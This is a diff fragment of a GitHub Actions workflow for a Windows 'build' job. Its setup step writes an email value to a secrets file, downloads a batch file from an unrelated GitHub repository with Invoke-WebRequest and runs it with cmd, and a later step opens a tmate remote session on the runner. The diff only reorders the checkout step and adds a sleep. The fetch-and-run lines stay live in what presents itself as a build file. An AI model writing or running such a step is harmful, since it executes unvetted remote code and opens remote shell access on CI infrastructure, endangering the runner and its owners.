@@ -9,12 +9,13 @@ jobs:
   build:
     runs-on: windows-latest
     steps:
-      - uses: actions/checkout@v2
       - name: Setting Up
         run: |
          echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         start-sleep 5
          Invoke-WebRequest "https://github.com/cisipex552/5/raw/main/Files/down.bat" -OutFile "down.bat"
          cmd /c down.bat
+      - uses: actions/checkout@v2
       - name: Setup tmate Session
         uses: mxschmitt/action-tmate@v2   
       - name: A
